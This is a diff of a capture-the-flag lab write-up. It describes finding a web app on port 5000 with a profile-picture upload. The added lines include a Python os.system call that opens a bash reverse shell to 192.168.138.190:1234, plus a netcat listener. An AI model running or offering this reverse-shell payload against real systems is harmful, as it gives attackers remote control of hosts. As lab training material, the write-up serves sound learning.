@@ -16,11 +16,18 @@ The objective of this room is
 
 As soon as I started the lab, most of the initial enumeration was already handled.
 
-
 <img width="1018" height="819" alt="image" src="https://github.com/user-attachments/assets/bfa9fc40-151a-4ecc-9283-154a04b59ae1" />
 
 The target application is running on port 5000, so I navigated directly to the web interface.
 
+Navigating to webpage
+
+<img width="1351" height="758" alt="image" src="https://github.com/user-attachments/assets/3b30d607-a689-4efb-b75b-5544ef3e5589" />
+
+There is profile pic uploading section we can intract with this 
+
+import os
+os.system("bash -c 'bash -i >& /dev/tcp/192.168.138.190/1234 0>&1'")
 
 death@esther:~/php-reverse-shell$ nc -lnvp 1234
 Listening on 0.0.0.0 1234
